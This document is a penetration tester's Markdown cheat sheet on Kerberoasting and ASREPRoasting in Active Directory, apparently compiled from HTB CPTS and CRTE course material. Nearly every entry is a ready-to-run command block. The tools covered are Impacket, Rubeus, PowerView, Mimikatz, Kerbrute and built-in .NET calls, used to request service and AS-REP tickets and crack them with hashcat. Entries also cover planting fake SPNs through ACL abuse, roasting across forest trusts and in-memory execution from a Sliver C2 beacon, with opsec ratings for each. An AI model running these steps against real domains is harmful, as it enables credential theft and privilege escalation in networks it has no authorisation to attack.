# Kerberoasting & ASREPRoasting

> **Pre-req:** `source /opt/venvTools/bin/activate`

## Kerberoasting — Request TGS Tickets for Offline Hash Cracking

### Kerberoasting from Linux (Impacket) [added: 2026-04]
- **Tags:** #Kerberoasting #Impacket #GetUserSPNs #TGS #hashcat #OfflineCracking #T1558.003
- **Trigger:** Port 88 open, valid domain credentials obtained, SPN accounts suspected
- **Prereq:** Valid domain credentials (any user); network access to DC on port 88
- **Yields:** TGS hashes for offline cracking; potential service account plaintext passwords
- **Opsec:** Med
- **Context:** Have any valid domain credentials — request TGS tickets for SPN accounts to crack offline
- **Payload/Method:**
  ```bash
  # List SPNs only
  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/username

  # Request all TGS tickets
  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/username -request

  # Target specific user
  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN.LOCAL/username -request-user sqldev -outputfile sqldev_tgs

  # Cross-forest kerberoasting
  GetUserSPNs.py -request -target-domain TRUSTED.DOMAIN.LOCAL DOMAIN.LOCAL/<USER>

  # Crack
  hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
  ```

### Kerberoasting from Windows (Rubeus) [added: 2026-04]
- **Tags:** #Kerberoasting #Rubeus #TGS #WindowsAttack #SPN #OfflineCracking #T1558.003
- **Trigger:** On a domain-joined Windows host with valid domain context
- **Prereq:** Domain-joined Windows host; valid domain user context
- **Yields:** TGS hashes for offline cracking with opsec control (RC4 vs AES filtering)
- **Opsec:** Med
- **Context:** On a domain-joined Windows host — Rubeus provides more control and opsec
- **Payload/Method:**
  ```powershell
  # Check stats first (how many RC4 vs AES tickets)
  .\Rubeus.exe kerberoast /stats

  # Target high-value accounts (admincount=1)
  .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

  # Target specific user
  .\Rubeus.exe kerberoast /user:testspn /nowrap

  # Check encryption type before requesting (RC4 = easier to crack)
  Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

  # Cross-forest
  .\Rubeus.exe kerberoast /domain:TRUSTED.DOMAIN.LOCAL /user:mssqlsvc /nowrap
  ```

### Kerberoasting from Windows (PowerView) [added: 2026-04]
- **Tags:** #Kerberoasting #PowerView #TGS #GetDomainSPNTicket #Hashcat #T1558.003
- **Trigger:** On domain-joined host without Rubeus but PowerView available
- **Prereq:** PowerView loaded; valid domain user context
- **Yields:** TGS hashes exported in Hashcat format for offline cracking
- **Opsec:** Med
- **Context:** No Rubeus available — use PowerView to extract and format hashes
- **Payload/Method:**
  ```powershell
  Import-Module .\PowerView.ps1

  # Find SPN accounts
  Get-DomainUser * -SPN | select samaccountname
  Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

  # Request and format for Hashcat in one step
  Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

  # Bulk export to CSV
  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
  ```

### Kerberoasting via Mimikatz (export .kirbi → crack on Linux) [added: 2026-04]
- **Tags:** #Kerberoasting #Mimikatz #kirbi #TGS #kirbi2john #OfflineCracking #T1558.003
- **Trigger:** Mimikatz access on target host, need to export Kerberos tickets
- **Prereq:** Mimikatz running on domain-joined host with valid domain context
- **Yields:** Base64-encoded TGS tickets convertible to Hashcat format for cracking
- **Opsec:** High
- **Context:** On-box with Mimikatz access — export base64 tickets then crack offline
- **Payload/Method:**
  ```
  mimikatz # base64 /out:true
  mimikatz # kerberos::list /export

  # On Linux: decode and crack
  echo "<base64blob>" | tr -d \\n | base64 -d > sqldev.kirbi
  python2.7 kirbi2john.py sqldev.kirbi
  sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
  hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
  ```

### Set Fake SPN on User (Targeted Kerberoasting via ACL abuse) [added: 2026-04]
- **Tags:** #TargetedKerberoasting #ACLAbuse #GenericWrite #SetSPN #Rubeus #T1558.003 #T1134
- **Trigger:** GenericWrite or GenericAll on a high-value user account identified via BloodHound
- **Prereq:** GenericWrite or GenericAll permission on target user
- **Yields:** TGS hash of target user for offline cracking (without needing existing SPN)
- **Opsec:** Med
- **Context:** Have `GenericWrite` or `GenericAll` on a user — set SPN to make them kerberoastable
- **Payload/Method:**
  ```powershell
  # Set fake SPN
  Set-DomainObject -Credential $Cred -Identity <TARGET_USER> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

  # Request and crack the ticket
  .\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap

  # Clean up after PoC
  Set-DomainObject -Credential $Cred -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose
  ```

### Targeted Kerberoasting via GenericWrite + Alternate Cred Object (CRTE / HTB CPTS) [added: 2026-04]
- **Tags:** #TargetedKerberoasting #GenericWrite #CredentialObject #Impacket #SetSPN #T1558.003
- **Trigger:** GenericWrite over a user via group membership, alternate credential object available
- **Prereq:** GenericWrite on target user via controlled principal; valid credentials for the controlling principal
- **Yields:** TGS hash of target user for offline cracking via SPN injection
- **Opsec:** Med
- **Context:** A user with GenericWrite over a target account can inject an SPN and Kerberoast — avoids password reset which is more visible.
- **Payload/Method:**
```powershell
$SecPassword = ConvertTo-SecureString '<CONTROLLING_USER_PASS>' -AsPlainText -Force
$CredCtrl = New-Object System.Management.Automation.PSCredential('DOMAIN\<CONTROLLING_USER>', $SecPassword)
Set-DomainObject -Credential $CredCtrl -Identity <TARGET_USER> -SET @{serviceprincipalname='fake/SPN'} -Verbose

# Kerberoast from Linux (proxychains for internal target)
proxychains impacket-GetUserSPNs domain.local/<CONTROLLING_USER>:'<CONTROLLING_USER_PASS>' -dc-ip <DC_IP> -request-user <TARGET_USER>
hashcat -m 13100 <TARGET_USER>.txt /usr/share/wordlists/rockyou.txt
```

### Cross-Domain Kerberoasting via Forest Trust (HTB CPTS) [added: 2026-04]
- **Tags:** #CrossForestKerberoasting #ForestTrust #Rubeus #Kerberoasting #TrustAbuse #T1558.003
- **Trigger:** Bidirectional forest trust discovered; DA on one domain achieved
- **Prereq:** DA on domain A with bidirectional forest trust to domain B
- **Yields:** TGS hashes of service accounts in trusted domain B
- **Opsec:** Med
- **Context:** Have DA on domain A with bidirectional forest trust to domain B. Kerberoast service accounts in domain B from domain A DC.
- **Payload/Method:**
```powershell
# From domain A DC (or machine with access to domain B DC)
Rubeus.exe kerberoast /domain:trustedomain.local /nowrap /user:svc_target
hashcat -m 13100 svc_target.hash /usr/share/wordlists/rockyou.txt
```

### Kerberoasting via Sliver execute-assembly (LabManual Sliver) [added: 2026-04]
- **Tags:** #Kerberoasting #Sliver #ExecuteAssembly #Rubeus #C2 #InMemory #T1558.003
- **Trigger:** Active Sliver beacon session on domain-joined host
- **Prereq:** Sliver beacon session; Rubeus.exe accessible on C2
- **Yields:** TGS hashes for offline cracking via in-memory execution (no disk write)
- **Opsec:** Med
- **Context:** Running Sliver beacon session. Execute Rubeus in-memory via execute-assembly to avoid disk writes.
- **Payload/Method:**
```
[server] sliver (session) > execute-assembly -P <PID> -p 'C:\windows\system32\taskhostw.exe' -t 80 '/mnt/c/AD/Tools/Rubeus.exe' 'kerberoast /outfile:hashes.txt /nowrap'
```

## ASREPRoasting — No Pre-Auth Required Accounts

### ASREPRoasting from Windows (Rubeus) [added: 2026-04]
- **Tags:** #ASREPRoasting #Rubeus #DONT_REQ_PREAUTH #AS-REP #hashcat #T1558.004
- **Trigger:** Accounts with DONT_REQ_PREAUTH flag discovered during LDAP enumeration
- **Prereq:** Knowledge of account with pre-auth disabled (or ability to enumerate)
- **Yields:** AS-REP hash for offline cracking; potential plaintext password
- **Opsec:** Low
- **Context:** Account has `DONT_REQ_PREAUTH` set — no credentials needed, request AS-REP directly
- **Payload/Method:**
  ```powershell
  # Find vulnerable accounts
  Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol

  # Request AS-REP hash
  .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

  # Crack
  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
  ```

### ASREPRoasting from Linux (no creds needed for enumeration) [added: 2026-04]
- **Tags:** #ASREPRoasting #Kerbrute #GetNPUsers #Impacket #UserEnum #T1558.004
- **Trigger:** Port 88 open, username list available, no valid credentials yet
- **Prereq:** Username wordlist; network access to DC on port 88
- **Yields:** Valid usernames confirmed AND AS-REP hashes for no-preauth accounts
- **Opsec:** Low
- **Context:** Kerbrute can enumerate valid usernames AND harvest AS-REP hashes in one pass
- **Payload/Method:**
  ```bash
  # Enumerate users AND auto-harvest AS-REP for no-preauth accounts
  $HOME/Pentester/ptTools/static_binaries/kerbrute/kerbrute_linux_amd64 userenum -d <DOMAIN> --dc <DC_IP> <WORDLIST>

  # With creds: use GetNPUsers
  GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -format hashcat
  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
  ```

### Kerberoasting via setspn.exe + .NET (No PowerView/Rubeus) [added: 2026-04]
- **Tags:** #Kerberoasting #setspn #DotNet #LOLBin #NoTools #BuiltIn #T1558.003
- **Trigger:** Restricted environment with no external tooling allowed; need to Kerberoast
- **Prereq:** Domain-joined Windows host; valid domain user context; no AV/EDR blocking .NET calls
- **Yields:** TGS tickets for SPN accounts via built-in Windows tools
- **Opsec:** Low
- **Context:** Restricted environment with no tooling -- use built-in setspn.exe and .NET classes to request TGS tickets
- **Payload/Method:**
  ```powershell
  # Enumerate all SPNs
  setspn.exe -Q */*

  # Request specific TGS via .NET
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/target.domain.local:1433"

  # Bulk request all TGS tickets via setspn + .NET pipeline
  setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
  ```
